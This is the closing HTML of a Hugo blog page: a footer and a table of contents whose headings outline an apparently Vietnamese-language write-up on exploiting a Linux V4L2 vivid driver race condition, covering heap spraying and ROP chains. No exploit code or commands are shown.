    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 14.71L12 10.83l3.88 3.88c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L12.7 8.71c-.39-.39-1.02-.39-1.41 0L6.7 13.3c-.39.39-.39 1.02 0 1.41.39.38 1.03.39 1.42 0z"/></svg>
  </div>
</div>

    <hr />

    <div class="basicflex flexwrap">
        
            
        
            
        
    </div>

    <div class="footer__poweredby">
        
                
            <p class="caption">
                
                    ©2021, All Rights Reserved
                
            </p>
        

        
            <p class="caption">Powered by <a href="https://gohugo.io/" target="_blank" rel="noreferrer">Hugo</a> and the <a href="https://github.com/zzossig/hugo-theme-zzo" target="_blank" rel="noreferrer">Zzo theme</a></p>
        
        
    </div> 
</footer>
        </div>
        





<div class="wrapper__right hide" data-pad="true" dir="ltr">
  <script>document.querySelector('.wrapper__right').classList.remove('hide')</script>
  
    
      
        <div class="toc__flexbox--outer" data-position="fixed" data-dir="ltr" data-ani="true">
          <h6 class="toc__title toc__title--outer" data-ani="true">What&#39;s on this Page</h6>
          
          <label class="switch" data-ani="true">
            <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
            <span class="slider round"></span>
          </label>
          
        </div>
        <div class="toc toc__outer " data-dir="ltr" data-folding="true" data-ani="true">
          <nav id="TableOfContents">
  <ul>
    <li><a href="#vulnerabilities">Vulnerabilities</a></li>
    <li><a href="#open-read-và-close-trong-vivid">open, read và close trong vivid</a>
      <ul>
        <li><a href="#open">open</a></li>
        <li><a href="#read">read</a></li>
        <li><a href="#close">close</a></li>
      </ul>
    </li>
    <li><a href="#bugs-and-fixes">Bugs and Fixes</a></li>
    <li><a href="#winning-the-race">Winning the race</a></li>
    <li><a href="#deceived-v4l2-sub-system">Deceived V4L2 sub system</a></li>
    <li><a href="#heap-spraying">Heap spraying</a></li>
    <li><a href="#control-flow-hijack-for-v4l2-subsystem">Control flow hijack for V4L2 subsystem</a>
      <ul>
        <li><a href="#unexpected-troubles-kthread-context">Unexpected troubles: kthread context</a></li>
      </ul>
    </li>
    <li><a href="#exploit-orchestra">Exploit Orchestra</a>
      <ul>
        <li><a href="#anatomy-of-the-exploit-payload">Anatomy of the exploit payload</a></li>
        <li><a href="#ropnjop">ROP&rsquo;n&rsquo;JOP</a></li>
        <li><a href="#cách-thức-hoạt-động-của-rop-chain">Cách thức hoạt động của ROP chain</a></li>
      </ul>
    </li>
    <li><a href="#một-số-ảnh-hưởng-tới-việc-khai-thác">Một số ảnh hưởng tới việc khai thác</a></li>
    <li><a href="#poc-detail">poc detail</a>
      <ul>
        <li><a href="#môi-trường-thực-thi">Môi trường thực thi</a></li>
        <li><a href="#init-and-start-setxattr_userfaltfd_monitor-adjtimex_userfaultfd_monitor">Init and start setxattr_userfaltfd_monitor, adjtimex_userfaultfd_monitor</a></li>
      </ul>
    </li>
    <li><a href="#nguồn-tham-khảo">Nguồn tham khảo</a></li>
  </ul>
</nav>
        </div>
      
    
  
</div>

    </div>
</body>

</html>